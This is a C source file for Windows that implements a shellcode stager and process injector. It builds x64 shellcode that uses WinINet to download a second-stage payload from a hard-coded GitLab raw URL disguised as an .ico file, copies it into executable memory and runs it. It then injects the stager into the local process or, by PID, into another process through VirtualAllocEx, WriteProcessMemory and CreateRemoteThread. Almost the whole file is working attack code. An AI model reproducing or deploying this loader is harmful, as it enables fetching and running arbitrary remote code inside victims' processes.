#include <Windows.h>
#include <stdio.h>


typedef unsigned long long uint64_t;
typedef unsigned int       uint32_t;

#define PAYLOAD_LINK "https://gitlab.com/ORCA000/d.rdynamicshellcode/-/raw/main/calc.ico?inline=false"		// url to the payload
#define PAYLOAD_SIZE 0x110				//272																// the size of the payload
#define REMOTE



unsigned char Shellcode[256] = {

	0x48, 0x83, 0xEC, 0x38,
#ifdef REMOTE
	0x68, 0x64, 0x6C, 0x6C, 0x00,										
	0x48, 0xB8, 0x77, 0x69, 0x6E, 0x69, 0x6E, 0x65, 0x74, 0x2E,			
	0x50,																
	0x48, 0x8B, 0xCC,												

	0x48, 0x83, 0xEC, 0x20,												
	0x48, 0xB8,															// * LoadLibraryA (29)
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,						
	0xFF, 0xD0,															
	0x48, 0x83, 0xC4, 0x30,												
#else
	
	0x90, 0x90, 0x90, 0x90, 0x90,
	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
	0x90,
	0x90, 0x90, 0x90,

	0x90, 0x90, 0x90, 0x90,
	0x90, 0x90,
	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
	0x90, 0x90,
	0x90, 0x90, 0x90, 0x90,

#endif //REMOTE

	0x68, 0x74, 0x73, 0x65, 0x74,
	0x6A, 0x00,
	0x48 ,0x8B, 0xCC,
	0x33, 0xD2,
	0x45, 0x33, 0xC0,
	0x45, 0x33, 0xC9,
	0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,
	0x48, 0xB8, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,						// * InternetOpenA (72)
	0xFF, 0xD0,
	0x48, 0x89, 0x44, 0x24, 0x30,


	0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,
	0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x44, 0x00, 0x80,
	0x45, 0x33, 0xC9,
	0x45, 0x33, 0xC0,
	0x48, 0xBA,													
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,						// * PAYLOAD_LINK (113)
	0x48, 0x8B, 0x4C, 0x24, 0x30,
	0x48, 0xB8, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,						// * InternetOpenUrlA (128)
	0xFF, 0xD0,
	0x48, 0x89, 0x44, 0x24, 0x28,



	0x41, 0xB9, 0x40, 0x00, 0x00, 0x00,
	0x41, 0xB8, 0x00, 0x30, 0x00, 0x00,
	0xBA,														
	0x00, 0x00, 0x00, 0x00,												// * PAYLOAD_SIZE (156)
	0x33, 0xC9,
	0x48, 0xB8,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,						// * VirtualAlloc (164)
	0xFF, 0xD0,
	0x48, 0x89, 0x44, 0x24, 0x20,


	0x4C, 0x8B, 0xCC,											
	0x41, 0xB8,													
	0x00, 0x00, 0x00, 0x00,												// * PAYLOAD_SIZE (184)
	0x48, 0x8B, 0x54, 0x24, 0x20,
	0x48, 0x8B, 0x4C, 0x24, 0x28,
	0x48, 0xB8,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,						// * InternetReadFile (200)
	0xFF, 0xD0,


	0x48, 0x8B, 0x4C, 0x24, 0x28,
	0x48, 0xB8,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,						// * InternetCloseHandle (217)
	0xFF, 0xD0,
	
	0x48, 0x8B, 0x4C, 0x24, 0x30,
	0x48, 0xB8,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,						// * InternetCloseHandle (234)
	0xFF, 0xD0,

	0x48, 0x8B, 0x44, 0x24, 0x20,
	0xFF, 0xD0,
	
	0x48, 0x83, 0xC4, 0x38,
	0xC3
};

#define ALLOCSIZE	 sizeof(Shellcode)	


BOOL PatchShellcode(PBYTE pUrl, SIZE_T PayloadSize) {
	
	const int pLoadLibraryA_offset			= 29;
	const int pInternetOpenA_offset			= 72;
	const int pUrl_offset					= 113;
	const int pInternetOpenUrlA_offset		= 128;

	const int pSize_offset1					= 156;
	const int pVirtualAlloc_offset			= 164;

	const int pSize_offset2					= 184;
	const int pInternetReadFile_offset		= 200;

	const int pInternetCloseHandle_offset1	= 217;
	const int pInternetCloseHandle_offset2	= 234;


	uint64_t ppUrl = (uint64_t)(pUrl);
	memcpy(&Shellcode[pUrl_offset], &ppUrl, sizeof(ppUrl));


	uint32_t pSize = (uint32_t)PayloadSize;
	memcpy(&Shellcode[pSize_offset1], &pSize, sizeof(pSize));
	memcpy(&Shellcode[pSize_offset2], &pSize, sizeof(pSize));

	if (LoadLibraryA("Wininet.dll") == NULL) {
		return FALSE;
	}

	uint64_t pInternetOpenA = (uint64_t)GetProcAddress(GetModuleHandleA("Wininet.dll"), "InternetOpenA");
	uint64_t pInternetOpenUrlA = (uint64_t)GetProcAddress(GetModuleHandleA("Wininet.dll"), "InternetOpenUrlA");
	uint64_t pVirtualAlloc = (uint64_t)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "VirtualAlloc");
	uint64_t pLoadLibraryA = (uint64_t)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA");
	uint64_t pInternetReadFile = (uint64_t)GetProcAddress(GetModuleHandleA("Wininet.dll"), "InternetReadFile");
	uint64_t pInternetCloseHandle = (uint64_t)GetProcAddress(GetModuleHandleA("Wininet.dll"), "InternetCloseHandle");


	if (pInternetOpenA == NULL	||
		pInternetOpenUrlA == NULL ||
		pVirtualAlloc == NULL ||
		pLoadLibraryA == NULL ||
		pInternetReadFile == NULL ||
		pInternetCloseHandle == NULL ){

		return FALSE;
	}

	memcpy(&Shellcode[pInternetOpenA_offset], &pInternetOpenA, sizeof(pInternetOpenA));
	memcpy(&Shellcode[pInternetOpenUrlA_offset], &pInternetOpenUrlA, sizeof(pInternetOpenUrlA));

	memcpy(&Shellcode[pVirtualAlloc_offset], &pVirtualAlloc, sizeof(pVirtualAlloc));
#ifdef REMOTE
	memcpy(&Shellcode[pLoadLibraryA_offset], &pLoadLibraryA, sizeof(pLoadLibraryA));
#endif // REMOTE
	memcpy(&Shellcode[pInternetReadFile_offset], &pInternetReadFile, sizeof(pInternetReadFile));
	memcpy(&Shellcode[pInternetCloseHandle_offset1], &pInternetCloseHandle, sizeof(pInternetCloseHandle));
	memcpy(&Shellcode[pInternetCloseHandle_offset2], &pInternetCloseHandle, sizeof(pInternetCloseHandle));

	return TRUE;
}



VOID LocalInjection() {
	PVOID pAddress = NULL;
	if ((pAddress = VirtualAlloc(NULL, ALLOCSIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL) {
		return;
	}
	memcpy(pAddress, Shellcode, sizeof(Shellcode));
	printf("[+] Local Process: %s : 0x%p \n", "pAddress", pAddress);
	printf("[+] Press <Enter> To Run  ...");
	getchar();
	(*(void(*)())pAddress)();
}


BOOL Remote(HANDLE hProc) {
	PVOID pAddress = NULL;

	if ((pAddress = VirtualAllocEx(hProc, NULL, (ALLOCSIZE + sizeof(PAYLOAD_LINK)), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL) {
		return FALSE;
	}
	
	printf("[+] %s : 0x%p \n", "pAddress", pAddress);

	if (!WriteProcessMemory(hProc, pAddress, PAYLOAD_LINK, sizeof(PAYLOAD_LINK), NULL)) {
		return FALSE;
	}

	printf("[i] Pathcing The Shellcode ... ");
	if (!PatchShellcode(pAddress, PAYLOAD_SIZE)) {
		printf("[-] ERROR \n");
		return FALSE;
	}
	printf("[+] DONE \n");


	pAddress = (ULONG_PTR)pAddress + sizeof(PAYLOAD_LINK) + 1;
	
	if (!WriteProcessMemory(hProc, pAddress, Shellcode, sizeof(Shellcode), NULL)) {
		return FALSE;
	}

	printf("[+] Remote Process: %s : 0x%p \n", "pAddress", pAddress);
	printf("[+] Press <Enter> To Run  ...");
	getchar();

	HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pAddress, NULL, NULL, NULL);
	WaitForSingleObject(hThread, INFINITE);

	return TRUE;
}



int main(int argc, char* argv[]) {
	

	BOOL	Remotely = FALSE;
	HANDLE	hProcess = NULL;

#ifdef REMOTE
	if (argc < 2) {
		printf("[i] Running The Shellcode Locally, No Pid Specified ... \n");
	}
	else {
		DWORD Pid = atoi(argv[1]);
		printf("[i] Targetting Process With Pid : %d \n", Pid);
		if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, Pid)) == NULL) {
			printf("[!] Failed To Open A Handle Error : %d \n", GetLastError());
			return -1;
		}
		Remotely = TRUE;
	}

#endif // REMOTE

	


	printf("[+] %s : 0x%p \n", "Shellcode", (PVOID)Shellcode);

	
	if (!Remotely) {
		printf("[i] Pathcing The Shellcode ... ");
		if (!PatchShellcode(&PAYLOAD_LINK, PAYLOAD_SIZE)) {
			printf("[-] ERROR \n");
			return -1;
		}
		printf("[+] DONE \n");
	}
	
	
	if (Remotely) {
		if (!Remote(hProcess)) {
			return -1;
		};
	}
	else {
		LocalInjection();
	}

	printf("[+] Press <Enter> To Quit  ...");
	getchar();
	
	return 0;
}